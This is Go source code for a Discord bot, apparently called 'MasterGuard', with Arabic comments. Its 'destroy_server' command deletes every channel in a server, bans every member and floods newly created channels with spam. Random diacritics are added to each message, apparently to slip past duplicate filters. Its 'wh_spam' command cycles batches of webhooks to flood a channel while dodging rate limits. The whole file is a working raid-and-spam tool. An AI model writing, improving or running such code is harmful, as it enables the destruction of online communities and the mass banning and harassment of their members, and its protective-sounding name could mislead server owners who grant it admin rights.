package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
)

var client = &http.Client{
	Timeout: 10 * time.Second,
}

func main() {
	token := os.Getenv("MASTERGUARD_TOKEN")
	if token == "" {
		fmt.Println("❌ خطأ: لم يتم العثور على التوكن في متغير البيئة MASTERGUARD_TOKEN")
		return
	}

	sess, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("خطأ في إنشاء جلسة البوت:", err)
		return
	}

	sess.Identify.Intents = discordgo.IntentsGuilds | discordgo.IntentsGuildMembers | discordgo.IntentsAll

	// تعريف الأمر الأول: تدمير السيرفر
	cmdDestroy := "destroy_server"
	commandDestroy := &discordgo.ApplicationCommand{
		Name:        cmdDestroy,
		Description: "أمر تدمير السيرفر (باند مضمون وسرعة صاروخية)",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "room_name",
				Description: "اسم الرومات الجديدة",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "rooms_count",
				Description: "عدد الرومات المراد إنشاؤها",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "message_content",
				Description: "محتوى رسالة السبام",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "messages_count",
				Description: "عدد الرسائل في كل روم",
				Required:    true,
			},
		},
	}

	// تعريف الأمر الثاني: سبام الويب هوك الديناميكي المطور
	cmdWhSpam := "wh_spam"
	commandWhSpam := &discordgo.ApplicationCommand{
		Name:        cmdWhSpam,
		Description: "أمر سبام ويب هوك السريع مع نظام تدوير وتكرار مضمون",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionChannel,
				Name:        "channel",
				Description: "الروم المراد إرسال الرسائل فيها",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "message_content",
				Description: "محتوى الرسالة",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "webhook_name",
				Description: "اسم الويب هوك",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "messages_count",
				Description: "عدد الرسائل الإجمالي للسبام",
				Required:    true,
			},
		},
	}

	sess.AddHandler(func(s *discordgo.Session, i *discordgo.InteractionCreate) {
		if i.Type != discordgo.InteractionApplicationCommand {
			return
		}

		cmdName := i.ApplicationCommandData().Name

		if cmdName == cmdDestroy {
			if (i.Member.Permissions & discordgo.PermissionAdministrator) == 0 {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "❌ يجب أن تكون مشرفاً لاستخدام هذا الأمر.",
						Flags:   discordgo.MessageFlagsEphemeral,
					},
				})
				return
			}

			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "🚀 جاري تدمير السيرفر وباند الأعضاء بالكامل في الخلفية...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})

			options := i.ApplicationCommandData().Options
			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
			for _, opt := range options {
				optionMap[opt.Name] = opt
			}

			roomName := optionMap["room_name"].StringValue()
			roomsCount := int(optionMap["rooms_count"].IntValue())
			messageContent := optionMap["message_content"].StringValue()
			messagesCount := int(optionMap["messages_count"].IntValue())
			guildID := i.GuildID

			go executeDestruction(s, token, guildID, roomName, roomsCount, messageContent, messagesCount)

		} else if cmdName == cmdWhSpam {
			if (i.Member.Permissions & discordgo.PermissionAdministrator) == 0 {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "❌ يجب أن تكون مشرفاً لاستخدام هذا الأمر.",
						Flags:   discordgo.MessageFlagsEphemeral,
					},
				})
				return
			}

			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "🚀 جاري تشغيل هجوم الويب هوكات المطور في الخلفية...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})

			options := i.ApplicationCommandData().Options
			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
			for _, opt := range options {
				optionMap[opt.Name] = opt
			}

			channelID := optionMap["channel"].ChannelValue(s).ID
			messageContent := optionMap["message_content"].StringValue()
			webhookName := optionMap["webhook_name"].StringValue()
			messagesCount := int(optionMap["messages_count"].IntValue())

			go executeWebhookSpamLoop(token, channelID, webhookName, messageContent, messagesCount)
		}
	})

	err = sess.Open()
	if err != nil {
		fmt.Println("خطأ في فتح الاتصال:", err)
		return
	}

	// تسجيل الأوامر
	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandDestroy)
	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandWhSpam)

	fmt.Println("🤖 البوت شغال الآن وجاهز لكلا الأمرين!")

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-stop

	sess.Close()
}

func executeDestruction(s *discordgo.Session, token, guildID, roomName string, roomsCount int, messageContent string, messagesCount int) {
	headers := map[string]string{
		"Authorization": "Bot " + token,
		"Content-Type":  "application/json",
	}

	// 1. حذف الرومات القديمة
	go func() {
		req, _ := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/channels", nil)
		for k, v := range headers {
			req.Header.Set(k, v)
		}
		resp, err := client.Do(req)
		if err != nil {
			return
		}
		defer resp.Body.Close()

		var channels []map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&channels)

		for _, ch := range channels {
			if id, ok := ch["id"].(string); ok {
				go func(chID string) {
					delReq, _ := http.NewRequest("DELETE", "https://discord.com/api/v10/channels/"+chID, nil)
					for k, v := range headers {
						delReq.Header.Set(k, v)
					}
					if r, e := client.Do(delReq); e == nil {
						r.Body.Close()
					}
				}(id)
			}
		}
	}()

	// 2. باند جميع الأعضاء
	go func() {
		var userIDs []string
		after := ""

		for {
			members, err := s.GuildMembers(guildID, after, 1000)
			if err != nil || len(members) == 0 {
				break
			}

			for _, member := range members {
				userIDs = append(userIDs, member.User.ID)
				after = member.User.ID
			}

			if len(members) < 1000 {
				break
			}
		}

		batchSize := 50
		for i := 0; i < len(userIDs); i += batchSize {
			end := i + batchSize
			if end > len(userIDs) {
				end = len(userIDs)
			}

			for _, uID := range userIDs[i:end] {
				go func(id string) {
					err := s.GuildBanCreate(guildID, id, 0)
					if err != nil {
						time.Sleep(150 * time.Millisecond)
					}
				}(uID)
			}
			time.Sleep(100 * time.Millisecond)
		}
	}()

	// 3. إنشاء الرومات بسرعة صاروخية
	var channelIDs []string
	var mu sync.Mutex
	var wg sync.WaitGroup

	groupSize := 10
	for i := 0; i < roomsCount; i += groupSize {
		end := i + groupSize
		if end > roomsCount {
			end = roomsCount
		}

		for j := i; j < end; j++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				payload, _ := json.Marshal(map[string]interface{}{
					"name": roomName,
					"type": 0,
				})
				req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(payload))
				for k, v := range headers {
					req.Header.Set(k, v)
				}

				resp, err := client.Do(req)
				if err != nil {
					return
				}
				defer resp.Body.Close()

				if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
					var chResult map[string]interface{}
					json.NewDecoder(resp.Body).Decode(&chResult)
					if chID, ok := chResult["id"].(string); ok {
						mu.Lock()
						channelIDs = append(channelIDs, chID)
						mu.Unlock()
					}
				} else if resp.StatusCode == 429 {
					time.Sleep(200 * time.Millisecond)
				}
			}()
		}
		wg.Wait()
		time.Sleep(30 * time.Millisecond)
	}

	// 4. إرسال الرسائل مع حركات التشكيل
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	arabicDiacritics := []string{"ِ", "ُ", "َّ", "ٍ", "ٓ", "ٌ", "ْ", "ٰ"}

	for i := 0; i < len(channelIDs); i += groupSize {
		end := i + groupSize
		if end > len(channelIDs) {
			end = len(channelIDs)
		}

		for _, chID := range channelIDs[i:end] {
			go func(cID string) {
				for m := 0; m < messagesCount; m++ {
					diacriticsSalt := ""
					for k := 0; k <= (m % 3); k++ {
						diacriticsSalt += arabicDiacritics[rng.Intn(len(arabicDiacritics))]
					}
					finalMsg := messageContent + diacriticsSalt

					msgPayload, _ := json.Marshal(map[string]string{"content": finalMsg})
					msgReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+cID+"/messages", bytes.NewBuffer(msgPayload))
					for k, v := range headers {
						msgReq.Header.Set(k, v)
					}

					msgResp, err := client.Do(msgReq)
					if err == nil {
						if msgResp.StatusCode == 429 {
							time.Sleep(500 * time.Millisecond)
						}
						msgResp.Body.Close()
					}
					time.Sleep(50 * time.Millisecond)
				}
			}(chID)
		}
		time.Sleep(40 * time.Millisecond)
	}
}

func executeWebhookSpamLoop(token, channelID, webhookName, messageContent string, messagesCount int) {
	headers := map[string]string{
		"Authorization": "Bot " + token,
		"Content-Type":  "application/json",
	}

	sentMessages := 0

	// لوب رئيسي يضمن استمرار الدورة (إنشاء 5 -> إرسال -> حذف -> انتظار 3 ثواني) لين يخلص العدد بالكامل
	for sentMessages < messagesCount {
		var wg sync.WaitGroup
		var activeWebhooks []string
		var mu sync.Mutex

		// 1. إنشاء 5 ويب هوكات دفعة واحدة
		for i := 0; i < 5; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				payload, _ := json.Marshal(map[string]string{
					"name": webhookName,
				})
				req, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+channelID+"/webhooks", bytes.NewBuffer(payload))
				for k, v := range headers {
					req.Header.Set(k, v)
				}

				resp, err := client.Do(req)
				if err != nil {
					return
				}
				defer resp.Body.Close()

				if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
					var wh map[string]interface{}
					if json.NewDecoder(resp.Body).Decode(&wh) == nil {
						if id, ok := wh["id"].(string); ok {
							if tokenWh, ok := wh["token"].(string); ok {
								whURL := fmt.Sprintf("https://discord.com/api/v10/webhooks/%s/%s", id, tokenWh)
								mu.Lock()
								activeWebhooks = append(activeWebhooks, whURL)
								mu.Unlock()
							}
						}
					}
				}
			}()
			time.Sleep(20 * time.Millisecond)
		}
		wg.Wait()

		// لو ما انصنعت ولا ويب هوك، ننتظر ثانية ونعيد المحاولة
		if len(activeWebhooks) == 0 {
			time.Sleep(1 * time.Second)
			continue
		}

		// 2. إرسال الرسائل لمدة 5 ثوانٍ باستخدام الـ 5 ويب هوكات الحالية
		stopTime := time.Now().Add(5 * time.Second)
		var spamWg sync.WaitGroup

		for time.Now().Before(stopTime) && sentMessages < messagesCount {
			for _, whURL := range activeWebhooks {
				if sentMessages >= messagesCount {
					break
				}

				spamWg.Add(1)
				go func(url string) {
					defer spamWg.Done()
					msgPayload, _ := json.Marshal(map[string]string{
						"content": messageContent,
					})
					req, _ := http.NewRequest("POST", url, bytes.NewBuffer(msgPayload))
					req.Header.Set("Content-Type", "application/json")

					resp, err := client.Do(req)
					if err != nil {
						return
					}
					defer resp.Body.Close()

					// التحقق أن الرسالة وصلت فعلاً قبل زيادة العداد
					if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
						mu.Lock()
						sentMessages++
						mu.Unlock()
					} else if resp.StatusCode == 429 {
						time.Sleep(300 * time.Millisecond)
					}
				}(whURL)
			}
			time.Sleep(30 * time.Millisecond)
		}
		spamWg.Wait()

		// 3. حذف الـ 5 ويب هوكات الحالية فور انتهاء الـ 5 ثواني
		for _, whURL := range activeWebhooks {
			go func(url string) {
				req, _ := http.NewRequest("DELETE", url, nil)
				resp, err := client.Do(req)
				if err == nil {
					resp.Body.Close()
				}
			}(whURL)
		}

		// 4. الانتظار لمدة 3 ثواني قبل بدء دورة جديدة (إنشاء 5 ويب هوكات جديدة) إذا لم يكتمل العدد
		if sentMessages < messagesCount {
			time.Sleep(3 * time.Second)
		}
	}
}
